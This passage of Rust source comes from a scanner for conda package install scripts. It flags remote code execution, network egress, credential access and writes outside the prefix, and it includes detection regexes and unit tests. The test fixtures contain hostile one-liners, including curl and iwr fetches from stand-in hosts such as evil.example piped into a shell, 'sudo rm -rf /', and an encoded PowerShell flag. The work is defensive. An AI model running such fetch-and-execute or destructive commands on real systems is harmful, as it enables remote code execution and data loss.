    use base64::Engine as _;
    let arg = arg.trim();
    if arg.is_empty() || arg.len() > MAX_ENCODED_CHARS {
        return None;
    }
    let raw = base64::engine::general_purpose::STANDARD.decode(arg).ok()?;
    if raw.len() % 2 == 0 {
        let units: Vec<u16> = raw
            .as_chunks::<2>()
            .0
            .iter()
            .copied()
            .map(u16::from_le_bytes)
            .collect();
        if let Ok(s) = String::from_utf16(&units) {
            return Some(s);
        }
    }
    String::from_utf8(raw).ok()
}

/// Finds inline interpreter invocations on one comment-stripped line and
/// returns each embedded program with the language it is written in.
fn extract_inline_code(flavor: Flavor, code: &str) -> Vec<(NestedLang, String)> {
    let mut out = Vec::new();
    if !RE_NEST_GATE.is_match(code) {
        return out;
    }
    let tokens = tokenize(flavor, code);
    let mut i = 0;
    while i < tokens.len() && out.len() < MAX_NESTED_PER_LINE {
        let at_command_start = i == 0 || {
            let p = &tokens[i - 1];
            // `FOO=1 node -e ...` keeps `node` in command position.
            p.separator
                || NESTED_WRAPPERS.contains(&p.text.as_str())
                || (!p.quoted && p.text.contains('='))
        };
        let interp = at_command_start
            .then(|| interpreter_for(&tokens[i].text))
            .flatten();
        let Some(interp) = interp else {
            i += 1;
            continue;
        };
        let mut j = i + 1;
        let stop = (i + 1 + MAX_NESTED_SCAN_TOKENS).min(tokens.len());
        while j < stop && !tokens[j].separator {
            let encoded = interp
                .encoded_flags
                .iter()
                .any(|f| tokens[j].text.eq_ignore_ascii_case(f));
            if encoded || is_code_flag(interp, &tokens[j].text) {
                let body = join_body(&tokens, j + 1).and_then(|b| {
                    if encoded {
                        decode_encoded_command(&b)
                    } else {
                        Some(b)
                    }
                });
                if let Some(b) = body {
                    out.push((interp.lang, truncate_chars(&b, MAX_NESTED_BODY_CHARS)));
                }
                break;
            }
            j += 1;
        }
        i = j + 1;
    }
    out
}

/// Analyses every inline program on a line. `depth` is the nesting level of
/// the line itself, so the recursion is bounded by [`MAX_NEST_DEPTH`].
fn check_nested_interpreters(flavor: Flavor, code: &str, depth: usize, out: &mut Vec<Hit>) {
    if depth >= MAX_NEST_DEPTH {
        return;
    }
    for (lang, body) in extract_inline_code(flavor, code) {
        match lang {
            NestedLang::Shell => check_nested_lines(Flavor::Shell, &body, depth + 1, out),
            NestedLang::PowerShell => check_nested_lines(Flavor::PowerShell, &body, depth + 1, out),
            NestedLang::Script | NestedLang::ScriptWithBackticks => {
                check_embedded_code(lang, &body, out);
                // Embedded code can shell out to yet another interpreter.
                check_nested_interpreters(flavor, &body, depth + 1, out);
            }
        }
    }
}

/// Runs the full rule engine over an embedded shell or PowerShell program.
fn check_nested_lines(flavor: Flavor, body: &str, depth: usize, out: &mut Vec<Hit>) {
    for line in body.split('\n').take(MAX_NESTED_LINES) {
        let code = match flavor {
            Flavor::PowerShell => strip_powershell_comment(line, false).0,
            _ => strip_hash_comment(line).to_owned(),
        };
        let code = code.trim();
        if !code.is_empty() {
            check_line(flavor, code, depth, out);
        }
    }
}

// ----- embedded-code rules -------------------------------------------------
//
// One table serves every scripting language. The patterns are API names
// specific to one language, so a union costs nothing in precision:
// `os.system(` cannot appear in JavaScript and `require('child_process')`
// cannot appear in Python. Anything that could not be made specific was left
// out rather than approximated.

re!(
    RE_EMB_EGRESS,
    concat_re!(
        // JavaScript.
        r"require\s*\(\s*[\x22'](?:node:)?(?:https?|net|dgram|tls)[\x22']",
        r"|\b(?:https?|axios|got|superagent)\.(?:get|post|put|request)\s*\(",
        r"|(?:^|[^.\w])fetch\s*\(|\bnew\s+XMLHttpRequest\b|\bnode-fetch\b",
        // Python.
        r"|\burllib\b|\burlopen\s*\(|\bhttp\.client\b|\bhttpx\.\w|\bsmtplib\.",
        r"|\brequests\.(?:get|post|put|patch|delete|head|request|Session)\s*\(",
        r"|\bsocket\.socket\s*\(|\bsocket\.create_connection\s*\(",
        // Ruby.
        r"|Net::(?:HTTP|FTP|SMTP)\b|\bopen-uri\b|\bURI\.open\s*\(|\bTCPSocket\b",
        // Perl.
        r"|\bLWP::|\bHTTP::Tiny\b|\bIO::Socket\b",
        // PHP.
        r"|\bfile_get_contents\s*\(\s*[\x22']?(?:https?|ftp)://|\bcurl_init\s*\(",
        r"|\bcurl_exec\s*\(|\bfsockopen\s*\(|\bstream_socket_client\s*\("
    )
);
re!(
    RE_EMB_CRED,
    concat_re!(
        r"(?:process\.env\.|process\.env\[\s*[\x22']|os\.environ\[\s*[\x22']",
        r"|os\.environ\.get\(\s*[\x22']|os\.getenv\(\s*[\x22']|\bENV\[\s*[\x22']",
        r"|\$ENV\{\s*[\x22']?|\$_ENV\[\s*[\x22']|\bgetenv\s*\(\s*[\x22'])",
        r"[A-Za-z0-9_]*(?i:",
        SECRET_NAME,
        r")",
        // The whole environment, which is where CI and cloud credentials live.
        r"|\(\s*process\.env\s*\)|\bdict\s*\(\s*os\.environ\b",
        r"|\bos\.environ\.copy\s*\(\s*\)|\bENV\.to_h\b"
    )
);
re!(
    RE_EMB_RCE,
    concat_re!(
        // JavaScript.
        r"require\s*\(\s*[\x22'](?:node:)?child_process[\x22']|\bchild_process\b",
        r"|\b(?:execSync|execFileSync|spawnSync|execFile)\s*\(|\b(?:exec|spawn)\s*\(\s*[\x22']",
        r"|\bnew\s+Function\s*\(|(?:^|[^.\w])Function\s*\(\s*[\x22']|\brunIn(?:New|This)?Context\s*\(",
        // Generic eval/exec forms, excluding method calls such as
        // `platform.system()` or `re.exec(x)`.
        r"|(?:^|[^.\w$])eval\s*\(|(?:^|[^.\w])exec\s*\(|(?:^|[^.\w])system\s*\(",
        r"|(?:^|[^.\w])popen\s*\(",
        // Python.
        r"|\bos\.system\s*\(|\bos\.popen\s*\(|\b__import__\s*\(",
        r"|\bsubprocess\.(?:run|call|check_call|check_output|Popen)\s*\(",
        // Ruby.
        r"|\binstance_eval\b|\bKernel\.(?:system|exec|spawn)\b|%x[\(\{\[]",
        // PHP.
        r"|\bshell_exec\s*\(|\bpassthru\s*\(|\bproc_open\s*\("
    )
);
// Ruby and Perl run backticked text as a shell command.
re!(RE_EMB_BACKTICK, r"`[^`]*[A-Za-z][^`]*`");

/// One pattern rule over the body of an inline interpreter invocation.
struct EmbeddedRule {
    re: &'static LazyLock<Regex>,
    rule: &'static str,
    severity: ScriptSeverity,
    explanation: &'static str,
}

static EMBEDDED_RULES: &[EmbeddedRule] = &[
    EmbeddedRule {
        re: &RE_EMB_RCE,
        rule: RULE_RCE,
        severity: ScriptSeverity::High,
        explanation: "Code embedded in an interpreter invocation evaluates a string as code or spawns a process; what actually runs is not visible in the hook.",
    },
    EmbeddedRule {
        re: &RE_EMB_EGRESS,
        rule: RULE_EGRESS,
        severity: ScriptSeverity::Medium,
        explanation: "Code embedded in an interpreter invocation opens a network connection at install time; confirm what is fetched or sent.",
    },
    EmbeddedRule {
        re: &RE_EMB_CRED,
        rule: RULE_CRED,
        severity: ScriptSeverity::Medium,
        explanation: "Code embedded in an interpreter invocation reads an environment variable that by name holds a token, secret, or password.",
    },
];

// Write calls whose target is a literal path. A computed target
// (`path.join(os.homedir(), ...)`) is not resolved and so not reported.
// Node fs API names, which are reached as `fs.writeFileSync(...)` or
// directly off `require('fs')`, so the module prefix cannot be required.
re!(
    RE_EMB_WRITE_JS,
    r"\b(?:writeFileSync|appendFileSync|createWriteStream|writeFile|appendFile)\s*\(\s*[\x22']([^\x22']+)"
);
re!(
    RE_EMB_WRITE_PY_OPEN,
    r"\bopen\s*\(\s*[\x22']([^\x22']+)[\x22']\s*,\s*[\x22'][wax]"
);
re!(
    RE_EMB_WRITE_PY_EXPAND,
    r"\bopen\s*\(\s*(?:os\.path\.)?expanduser\s*\(\s*[\x22']([^\x22']+)"
);
re!(
    RE_EMB_WRITE_PY_PATH,
    r"\bPath\s*\(\s*[\x22']([^\x22']+)[\x22']\s*\)\s*\.write_(?:text|bytes)\s*\("
);
re!(
    RE_EMB_WRITE_RB,
    r"\bFile\.write\s*\(\s*[\x22']([^\x22']+)|\bFile\.open\s*\(\s*[\x22']([^\x22']+)[\x22']\s*,\s*[\x22'][wa]"
);
re!(
    RE_EMB_WRITE_PHP,
    r"\bfile_put_contents\s*\(\s*[\x22']([^\x22']+)"
);
re!(
    RE_EMB_WRITE_PL,
    r"\bopen\s*\([^,)]*,\s*[\x22']\s*>>?\s*([^\x22']+)[\x22']"
);

static EMBEDDED_WRITES: &[&LazyLock<Regex>] = &[
    &RE_EMB_WRITE_JS,
    &RE_EMB_WRITE_PY_OPEN,
    &RE_EMB_WRITE_PY_EXPAND,
    &RE_EMB_WRITE_PY_PATH,
    &RE_EMB_WRITE_RB,
    &RE_EMB_WRITE_PHP,
    &RE_EMB_WRITE_PL,
];

/// Runs the embedded-code rules over one inline program.
fn check_embedded_code(lang: NestedLang, body: &str, out: &mut Vec<Hit>) {
    // Credential *stores* are named the same way in every language, and are
    // worse than an environment read, so this goes first: `finalize_line`
    // keeps the first hit per rule.
    if RE_CRED_PATH.is_match(body) {
        out.push(hit(
            RULE_CRED,
            ScriptSeverity::High,
            "Code embedded in an interpreter invocation touches a well-known credential store (SSH/cloud/keychain/git credentials).",
        ));
    }
    for r in EMBEDDED_RULES {
        if r.re.is_match(body) {
            out.push(hit(r.rule, r.severity, r.explanation));
        }
    }
    if lang == NestedLang::ScriptWithBackticks && RE_EMB_BACKTICK.is_match(body) {
        out.push(hit(
            RULE_RCE,
            ScriptSeverity::High,
            "Embedded Ruby/Perl code runs a shell command through backticks.",
        ));
    }
    // A write only matters once the target is known to be outside the prefix,
    // so an unresolvable target (`path.join(os.homedir(), ...)`) is silent.
    let write_target = EMBEDDED_WRITES.iter().find_map(|pattern| {
        pattern
            .captures_iter(body)
            .take(MAX_NESTED_PER_LINE)
            .find_map(|c| {
                c.iter()
                    .skip(1)
                    .flatten()
                    .next()
                    .and_then(|m| outside_prefix_target(m.as_str()))
            })
    });
    if let Some((severity, explanation)) = write_target {
        out.push(hit(RULE_WRITES, severity, explanation));
    }
}

#[cfg(ak_test_shard = "services-1")]
#[cfg(test)]
mod tests {
    use super::*;

    fn sh(body: &str) -> InstallScript {
        make_script("bin/.pkg-post-link.sh", body.as_bytes()).expect("valid script")
    }
    fn bat(body: &str) -> InstallScript {
        make_script("Scripts/.pkg-post-link.bat", body.as_bytes()).expect("valid script")
    }
    fn ps1(body: &str) -> InstallScript {
        make_script("Scripts/.pkg-post-link.ps1", body.as_bytes()).expect("valid script")
    }
    fn rules(findings: &[ScriptFinding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule.as_str()).collect()
    }
    fn assert_rule(findings: &[ScriptFinding], rule: &str, sev: ScriptSeverity) {
        let hit = findings
            .iter()
            .find(|f| f.rule == rule)
            .unwrap_or_else(|| panic!("expected rule `{rule}`, got {findings:#?}"));
        assert_eq!(hit.severity, sev, "severity for `{rule}` in {findings:#?}");
    }
    fn assert_no_rule(findings: &[ScriptFinding], rule: &str) {
        assert!(
            !findings.iter().any(|f| f.rule == rule),
            "did not expect `{rule}` in {findings:#?}"
        );
    }

    // ---------------------------------------------------------------- paths

    #[test]
    fn classifies_conventional_unix_paths() {
        assert_eq!(
            classify_script_path("bin/.numpy-post-link.sh"),
            Some(ScriptKind::PostLink)
        );
        assert_eq!(
            classify_script_path("bin/.numpy-pre-link.sh"),
            Some(ScriptKind::PreLink)
        );
        assert_eq!(
            classify_script_path("bin/.numpy-pre-unlink.sh"),
            Some(ScriptKind::PreUnlink)
        );
    }

    #[test]
    fn classifies_windows_paths_and_separators() {
        assert_eq!(
            classify_script_path("Scripts/.numpy-post-link.bat"),
            Some(ScriptKind::PostLink)
        );
        assert_eq!(
            classify_script_path("Scripts\\.numpy-pre-unlink.bat"),
            Some(ScriptKind::PreUnlink)
        );
        assert_eq!(
            classify_script_path("Scripts/.numpy-post-link.ps1"),
            Some(ScriptKind::PostLink)
        );
        assert_eq!(
            classify_script_path("SCRIPTS/.Numpy-POST-LINK.BAT"),
            Some(ScriptKind::PostLink)
        );
    }

    #[test]
    fn classifies_liberally_on_prefix_and_leading_dot() {
        assert_eq!(
            classify_script_path("numpy-post-link.sh"),
            Some(ScriptKind::PostLink)
        );
        assert_eq!(
            classify_script_path("info/recipe/post-link.sh"),
            Some(ScriptKind::PostLink)
        );
        assert_eq!(
            classify_script_path("etc/hooks/.my-pkg-pre-unlink.sh"),
            Some(ScriptKind::PreUnlink)
        );
        assert_eq!(
            classify_script_path("/abs/bin/.x-pre-link.sh"),
            Some(ScriptKind::PreLink)
        );
    }

    #[test]
    fn rejects_non_scripts() {
        assert_eq!(classify_script_path("bin/numpy"), None);
        assert_eq!(classify_script_path("bin/.numpy-post-link.txt"), None);
        assert_eq!(classify_script_path("lib/post-linker.sh"), None);
        assert_eq!(classify_script_path("bin/.numpy-post-link.sh.bak"), None);
        assert_eq!(classify_script_path("info/link.json"), None);
        assert_eq!(classify_script_path(""), None);
        assert_eq!(classify_script_path("bin/"), None);
        assert_eq!(classify_script_path("bin/.post-link-tool.sh"), None);
    }

    // ----------------------------------------------------------- make_script

    #[test]
    fn make_script_computes_sha256_and_kind() {
        let s = make_script("bin/.pkg-post-link.sh", b"hello").unwrap();
        assert_eq!(s.kind, ScriptKind::PostLink);
        assert_eq!(s.path, "bin/.pkg-post-link.sh");
        assert_eq!(s.body, "hello");
        assert_eq!(
            s.sha256,
            "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
        );
    }

    #[test]
    fn make_script_rejects_non_utf8_and_non_scripts() {
        assert!(make_script("bin/.pkg-post-link.sh", &[0xff, 0xfe, 0x00, 0x41]).is_none());
        assert!(make_script("bin/pkg", b"#!/bin/sh\n").is_none());
    }

    #[test]
    fn empty_file_is_a_script_with_no_findings() {
        let s = make_script("bin/.pkg-pre-unlink.sh", b"").unwrap();
        assert_eq!(s.kind, ScriptKind::PreUnlink);
        assert_eq!(
            s.sha256,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert!(analyze_script(&s).is_empty());
    }

    // -------------------------------------------------------- benign corpus

    /// Realistic install scripts modelled on what conda-forge feedstocks ship.
    /// Every one of these must produce zero findings.
    const BENIGN_SH: &[(&str, &str)] = &[
        (
            "messages",
            "#!/bin/bash\n\
             echo \"\n    Foo was installed. Run 'foo --help' to get started.\n\" >> $PREFIX/.messages.txt\n",
        ),
        (
            "activate-d and symlinks",
            "#!/bin/sh\n\
             set -e\n\
             mkdir -p \"$PREFIX/etc/conda/activate.d\"\n\
             mkdir -p \"${PREFIX}/etc/conda/deactivate.d\"\n\
             ln -sf \"$PREFIX/lib/libfoo.so.1.2.3\" \"$PREFIX/lib/libfoo.so.1\"\n\
             chmod +x \"$PREFIX/bin/foo\"\n\
             chmod 755 \"$PREFIX/bin/bar\"\n\
             chmod 0644 \"$PREFIX/etc/foo.conf\"\n",
        ),
        (
            "compileall and jupyter extension",
            "#!/bin/bash\n\
             \"$PREFIX/bin/python\" -m compileall -q \"$SP_DIR/foo\" > /dev/null 2>&1 || true\n\
             if [ -x \"$PREFIX/bin/jupyter\" ]; then\n\
             \x20 \"$PREFIX/bin/jupyter\" nbextension enable --py --sys-prefix widgetsnbextension >/dev/null 2>&1\n\
             fi\n",
        ),
        (
            "comments and urls in messages",
            "#!/bin/bash\n\
             # See https://github.com/conda-forge/foo-feedstock for details\n\
             # NOTE: we never do curl http://x | bash here\n\
             cat >> \"$PREFIX/.messages.txt\" <<EOF\n\
             Foo has been installed. Documentation: https://foo.readthedocs.io\n\
             To report issues visit https://github.com/foo/foo/issues or email foo@1.2.3.4\n\
             You may want to add settings to ~/.config/foo/config.toml\n\
             EOF\n\
             echo \"Docs: https://foo.readthedocs.io/en/latest/\" # trailing comment: sudo rm -rf /\n",
        ),
        (
            "pre-unlink cleanup",
            "#!/bin/sh\n\
             rm -f \"$PREFIX/lib/libfoo.so.1\"\n\
             rm -rf \"$PREFIX/share/foo/cache\"\n\
             rmdir \"$PREFIX/share/foo\" 2>/dev/null || true\n\
             exit 0\n",
        ),
        (
            "fonts registration",
            "#!/bin/bash\n\
             set -eu\n\
             FONTS_DIR=\"$PREFIX/fonts\"\n\
             mkdir -p \"$FONTS_DIR\"\n\
             for f in \"$PREFIX\"/share/fonts/*.ttf; do\n\
             \x20 ln -sf \"$f\" \"$FONTS_DIR/$(basename \"$f\")\"\n\
             done\n\
             if command -v fc-cache >/dev/null 2>&1; then\n\
             \x20 \"$PREFIX/bin/fc-cache\" -f \"$FONTS_DIR\" || true\n\
             fi\n",
        ),
        (
            "heredoc config with home paths in text",
            "cat > \"$PREFIX/etc/foo.conf\" <<'EOF'\n\
             # users may override in ~/.config/foo/foo.conf\n\
             cache_dir = ~/.cache/foo\n\
             token = $FOO_TOKEN\n\
             EOF\n\
             cat <<-\tMSG >> \"${PREFIX}/.messages.txt\"\n\
             \tRun: curl -sSL https://example.com/install.sh | sh  (not really, this is a message)\n\
             \tMSG\n",
        ),
        (
            "version compare and reads of system files",
            "#!/bin/bash\n\
             ver=\"1.2.3.4\"\n\
             if [[ \"$ver\" > \"1.0\" ]]; then echo \"new\"; fi\n\
             [ -f /etc/os-release ] && . /etc/os-release\n\
             cat /etc/os-release > /dev/null\n\
             echo \"os: $ID host: 127.0.0.1:8080\" >&2\n\
             ls /usr/lib >/dev/null 2>&1\n\
             cd /usr/share && ls\n",
        ),
        (
            "pre-link guard",
            "#!/bin/sh\n\
             if [ -z \"$PREFIX\" ]; then exit 1; fi\n\
             exit 0\n",
        ),
        (
            "sed, install, tee, printf in prefix",
            "#!/bin/bash\n\
             sed -i \"s|@PREFIX@|$PREFIX|g\" \"$PREFIX/etc/foo.cfg\"\n\
             install -m 644 \"$PREFIX/share/foo/x\" \"$PREFIX/etc/x\"\n\
             printf '%s\\n' \"hello\" | tee -a \"$PREFIX/.messages.txt\" > /dev/null\n\
             touch \"${PREFIX:-/opt/conda}/etc/stamp\"\n\
             export PATH=\"$PREFIX/bin:$PATH\"\n\
             \"$PREFIX/bin/ssh-keygen\" -A -f \"$PREFIX/etc/ssh\" 2>/dev/null || true\n\
             rsync -a \"$PREFIX/share/foo/\" \"$PREFIX/share/foo-backup/\"\n",
        ),
        (
            "offline pip install of a bundled wheel",
            "#!/bin/bash\n\
             \"$PREFIX/bin/python\" -m pip install --no-deps --no-index \"$PREFIX/share/wheels/foo-1.0-py3-none-any.whl\"\n",
        ),
        (
            "inline interpreters doing routine work",
            "#!/bin/sh\n\
             set -e\n\
             node -e \"console.log(require('./package.json').version)\" >> \"$PREFIX/.messages.txt\"\n\
             \"$PREFIX/bin/python\" -c \"import sys; sys.exit(0 if sys.version_info >= (3, 8) else 1)\"\n\
             sh -c 'mkdir -p \"$PREFIX/etc/conda/activate.d\"'\n\
             bash -c 'ln -sf \"$PREFIX/lib/libfoo.so.1.2.3\" \"$PREFIX/lib/libfoo.so.1\"'\n",
        ),
        (
            "long paths and hashes",
            "#!/bin/bash\n\
             EXPECTED=\"2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\"\n\
             ACTUAL=$(sha256sum \"$PREFIX/lib/python3.11/site-packages/somepackage/subpackage/anothersubpackage/yetanothersubpackage/module.py\" | cut -d' ' -f1)\n\
             [ \"$EXPECTED\" = \"$ACTUAL\" ] || echo \"checksum mismatch\" >> \"$PREFIX/.messages.txt\"\n",
        ),
    ];

    const BENIGN_BAT: &[(&str, &str)] = &[
        (
            "windows activate.d and copy",
            "@echo off\r\n\
             setlocal\r\n\
             if not exist \"%PREFIX%\\etc\\conda\\activate.d\" mkdir \"%PREFIX%\\etc\\conda\\activate.d\"\r\n\
             copy \"%PREFIX%\\Library\\bin\\foo.dll\" \"%PREFIX%\\Library\\bin\\foo-1.dll\" >nul\r\n\
             echo Foo installed. See https://example.com/docs >> \"%PREFIX%\\.messages.txt\"\r\n\
             REM curl http://evil.example/x | cmd  -- inside a REM comment\r\n\
             :: powershell -enc AAAA -- inside a :: comment\r\n\
             exit /b 0\r\n",
        ),
        (
            "windows run bundled ps1",
            "@echo off\r\n\
             powershell -NoProfile -ExecutionPolicy Bypass -File \"%PREFIX%\\Scripts\\setup.ps1\"\r\n\
             if errorlevel 1 exit /b 1\r\n",
        ),
    ];

    const BENIGN_PS1: &[(&str, &str)] = &[
        (
            "powershell activate.d",
            "# Post-link for foo\n\
             $ErrorActionPreference = \"Stop\"\n\
             <# block comment: iwr http://x | iex #>\n\
             $target = Join-Path $env:PREFIX \"etc\\conda\\activate.d\"\n\
             New-Item -ItemType Directory -Force -Path $target | Out-Null\n\
             Copy-Item \"$env:PREFIX\\Library\\share\\foo.conf\" (Join-Path $target \"foo.conf\") -Force\n\
             Add-Content -Path \"$env:PREFIX\\.messages.txt\" -Value \"Foo installed. Docs: https://foo.example.org\"\n\
             Write-Host \"done\"\n",
        ),
    ];

    /// Individual lines lifted from (or modelled on) real feedstock hooks.
    const BENIGN_SH_LINES: &[&str] = &[
        "sed -i.bak \"s|@PREFIX@|${PREFIX}|g\" \"${PREFIX}/lib/R/bin/R\" \"${PREFIX}/lib/R/etc/Renviron\"",
        "echo \"[Paths]\" > \"$PREFIX/bin/qt.conf\"",
        "echo \"Prefix = $PREFIX\" >> \"$PREFIX/bin/qt.conf\"",
        "\"$PREFIX/bin/python\" -E -s -m compileall -q -x \"bad_coding|badsyntax|site-packages\" \"$PREFIX/lib/python3.11\" > /dev/null 2>&1",
        "install_name_tool -change /usr/lib/libz.1.dylib @rpath/libz.1.dylib \"$PREFIX/bin/foo\"",
        "patchelf --set-rpath '$ORIGIN/../lib' \"$PREFIX/bin/foo\"",
        "gzip -d \"$PREFIX/share/foo/data.csv.gz\"",
        "gunzip -k \"$PREFIX/share/foo/data.csv.gz\"",
        "tar xzf \"$PREFIX/share/foo/bundle.tar.gz\" -C \"$PREFIX/share/foo\"",
        "\"$PREFIX/bin/git\" config --system http.sslcainfo \"$PREFIX/ssl/cacert.pem\"",
        "\"$PREFIX/bin/dot\" -c",
        "case \"$(uname -s)\" in Linux*) os=linux ;; Darwin*) os=osx ;; esac",
        "find \"$PREFIX/lib\" -name \"*.pyc\" -delete",
        "find \"$PREFIX/lib/foo\" -name \"*.so\" | xargs chmod 755",
        "[ -n \"$CONDA_BUILD\" ] && exit 0",
        "chown -R \"$USER:$GROUP\" \"$PREFIX/var\"",
        "chmod -R go-w \"$PREFIX/etc\"",
        "openssl rand -base64 32 > \"$PREFIX/etc/foo/secret.key\"",
        "echo -e \"\\e[1mFoo\\e[0m installed; run with sudo if you need system-wide access\"",
        "printf \"\\033[1;32m%s\\033[0m\\n\" \"done\"",
        "export SSH_AUTH_SOCK=\"$PREFIX/var/agent.sock\"",
        "if command -v sudo >/dev/null; then echo has sudo; fi",
        "which sudo > /dev/null 2>&1 && HAVE_SUDO=1",
        "umask 022",
        "exec > \"$PREFIX/.messages.txt\" 2>&1",
        "python -c \"import sys; print(sys.prefix)\"",
        "\"$PYTHON\" -m ipykernel install --sys-prefix --name foo",
        "ln -s \"$PREFIX/lib/libx.so\" \"$PREFIX/lib/liby.so\" 2>/dev/null || true",
        "grep -q foo /etc/hosts && echo present",
        "ldd \"$PREFIX/bin/foo\" | grep -q libGL || echo \"libGL missing\" >> \"$PREFIX/.messages.txt\"",
        "xmlcatalog --noout --create \"$PREFIX/etc/xml/catalog\"",
        "cd \"$PREFIX/share/foo\" && ./configure --prefix=\"$PREFIX\" >/dev/null",
        "trap \"rm -f $tmpfile\" EXIT",
        "tmpfile=$(mktemp) && echo x > \"$tmpfile\"",
        "ln -sf \"$PREFIX/ssl/cacert.pem\" \"$PREFIX/ssl/cert.pem\"",
        "GDAL_DATA=\"$PREFIX/share/gdal\"; export GDAL_DATA",
        "test -w \"$PREFIX\" || { echo \"not writable\"; exit 1; }",
        "echo \"To use system-wide, run: curl -fsSL https://x/install.sh | sudo bash\"",
        "echo 'Then add to your ~/.bashrc: export FOO=1' >> \"$PREFIX/.messages.txt\"",
        "pip install --no-deps --no-index \"$PREFIX/share/wheels/foo-1.0-py3-none-any.whl\" > /dev/null",
        // Inline interpreter invocations. These carry a real program, which
        // the nested-interpreter rules analyse; all of them are routine.
        "node -e \"console.log(require('./package.json').version)\"",
        "node -e 'process.exit(process.version.startsWith(\"v18\") ? 0 : 1)'",
        "node -e \"require('fs').mkdirSync(process.env.PREFIX + '/etc/foo', {recursive: true})\"",
        "\"$PREFIX/bin/python\" -c \"import sys; sys.exit(0 if sys.version_info >= (3, 8) else 1)\"",
        "python -c \"import json; print(json.dumps({'prefix': 1}))\"",
        "python3 -c \"open('$PREFIX/etc/stamp', 'w').close()\"",
        "sh -c 'mkdir -p \"$PREFIX/etc/conda/activate.d\"'",
        "bash -c 'echo \"Foo installed\" >> \"$PREFIX/.messages.txt\"'",
        "bash -ec 'test -x \"$PREFIX/bin/foo\"'",
        "ruby -e 'puts RUBY_VERSION'",
        "perl -e 'print \"ok\\n\"'",
        "perl -pi -e 's|\\@PREFIX\\@|$ENV{PREFIX}|g' \"$PREFIX/etc/foo.cfg\"",
        "php -r 'echo PHP_VERSION;'",
    ];

    const BENIGN_BAT_LINES: &[&str] = &[
        "for /f \"delims=\" %%i in ('dir /b \"%PREFIX%\\Lib\\site-packages\"') do echo %%i",
        "set \"MKL_DIR=%PREFIX%\\Library\\bin\"",
        "\"%PREFIX%\\python.exe\" -E -s -m compileall -q \"%PREFIX%\\Lib\" >nul 2>&1",
        "if errorlevel 1 exit 1",
        "copy /y \"%PREFIX%\\Library\\bin\\foo.dll\" \"%PREFIX%\\Library\\bin\\foo.dll.bak\" >nul",
        "del /q \"%PREFIX%\\Library\\bin\\foo.dll.bak\" 2>nul",
        "echo Foo installed. Run: foo --help >> \"%PREFIX%\\.messages.txt\"",
        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /v ProgramFilesDir",
        "echo %PREFIX%",
        "\"%PREFIX%\\Scripts\\pip.exe\" install --no-deps --no-index \"%PREFIX%\\share\\wheels\\foo.whl\"",
        "\"%PREFIX%\\python.exe\" -c \"import sys; sys.exit(0)\"",
        "node -e \"console.log(process.version)\"",
    ];

    const BENIGN_PS1_LINES: &[&str] = &[
        "$ErrorActionPreference = \"Stop\"",
        "Get-ChildItem \"$env:PREFIX\\Library\\bin\" -Filter *.dll | ForEach-Object { Copy-Item $_.FullName \"$env:PREFIX\\Library\\lib\" }",
        "& \"$env:PREFIX\\python.exe\" -m compileall -q \"$env:PREFIX\\Lib\" | Out-Null",
        "Write-Host \"Foo installed. Docs: https://foo.example.org\" -ForegroundColor Green",
        "[System.IO.File]::WriteAllText(\"$env:PREFIX\\etc\\foo.conf\", \"x\")",
        "if (Test-Path \"$env:PREFIX\\Library\\bin\\foo.exe\") { & \"$env:PREFIX\\Library\\bin\\foo.exe\" --init }",
        "Set-Content -Path \"$env:PREFIX\\etc\\foo.conf\" -Value \"[Paths]`nPrefix=$env:PREFIX\"",
        "$ver = (Get-Item \"$env:PREFIX\\Library\\bin\\foo.exe\").VersionInfo.FileVersion",
        "Remove-Item -Recurse -Force \"$env:PREFIX\\Library\\share\\foo\\cache\" -ErrorAction SilentlyContinue",
        "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path $env:PREFIX\\etc | Out-Null\"",
    ];

    #[test]
    fn benign_lines_produce_zero_findings() {
        let mut noise = Vec::new();
        for line in BENIGN_SH_LINES {
            let f = analyze_script(&sh(&format!("{line}\n")));
            if !f.is_empty() {
                noise.push(format!("sh: {line}\n{f:#?}"));
            }
        }
        for line in BENIGN_BAT_LINES {
            let f = analyze_script(&bat(&format!("{line}\r\n")));
            if !f.is_empty() {
                noise.push(format!("bat: {line}\n{f:#?}"));
            }
        }
        for line in BENIGN_PS1_LINES {
            let f = analyze_script(&ps1(&format!("{line}\n")));
            if !f.is_empty() {
                noise.push(format!("ps1: {line}\n{f:#?}"));
            }
        }
        assert!(noise.is_empty(), "false positives:\n{}", noise.join("\n"));
    }

    #[test]
    fn benign_corpus_produces_zero_findings() {
        let mut noise = Vec::new();
        for (name, body) in BENIGN_SH {
            let f = analyze_script(&sh(body));
            if !f.is_empty() {
                noise.push(format!("sh/{name}: {f:#?}"));
            }
            // CRLF variant must behave identically.
            let crlf = body.replace('\n', "\r\n");
            let f = analyze_script(&sh(&crlf));
            if !f.is_empty() {
                noise.push(format!("sh-crlf/{name}: {f:#?}"));
            }
        }
        for (name, body) in BENIGN_BAT {
            let f = analyze_script(&bat(body));
            if !f.is_empty() {
                noise.push(format!("bat/{name}: {f:#?}"));
            }
        }
        for (name, body) in BENIGN_PS1 {
            let f = analyze_script(&ps1(body));
            if !f.is_empty() {
                noise.push(format!("ps1/{name}: {f:#?}"));
            }
        }
        assert!(noise.is_empty(), "false positives:\n{}", noise.join("\n"));
    }

    // ----------------------------------------------------- comments/heredocs

    #[test]
    fn full_line_comment_does_not_fire() {
        assert!(analyze_script(&sh("# curl http://evil.example/x | sh\n")).is_empty());
        assert!(analyze_script(&sh("   #sudo rm -rf /\n")).is_empty());
    }

    #[test]
    fn trailing_comment_does_not_fire_but_quoted_hash_is_kept() {
        assert!(analyze_script(&sh("echo hi # curl http://evil.example/x | sh\n")).is_empty());
        let f = analyze_script(&sh("echo \"a # b\" > \"$HOME/.foo\"\n"));
        assert_rule(&f, "writes-outside-prefix", ScriptSeverity::Medium);
    }

    #[test]
    fn heredoc_body_is_not_executable_unless_fed_to_interpreter() {
        assert!(analyze_script(&sh(
            "cat <<EOF\ncurl http://evil.example/x | sh\nEOF\necho ok\n"
        ))
        .is_empty());
        let f = analyze_script(&sh("bash <<EOF\ncurl http://evil.example/x | sh\nEOF\n"));
        assert_rule(&f, "remote-code-execution", ScriptSeverity::High);
